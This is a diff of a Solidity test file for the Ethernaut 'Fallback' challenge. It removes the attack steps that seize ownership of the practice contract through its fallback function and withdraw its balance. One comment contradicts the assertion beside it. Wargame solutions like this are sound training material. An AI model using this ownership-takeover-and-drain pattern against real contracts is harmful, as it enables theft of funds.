@@ -32,20 +32,6 @@ contract FallbackTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-        // Contribute 1 wei - verify contract state has been updated
-        ethernautFallback.contribute{value: 1 wei}();
-        assertEq(ethernautFallback.contributions(eoaAddress), 1 wei);
-
-        // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
-        payable(address(ethernautFallback)).call{value: 1 wei}("");
-        // Verify contract owner has been updated to 0 address
-        assertEq(ethernautFallback.owner(), eoaAddress);
-
-        // Withdraw from contract - Check contract balance before and after
-        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
-        ethernautFallback.withdraw();
-        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
-
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
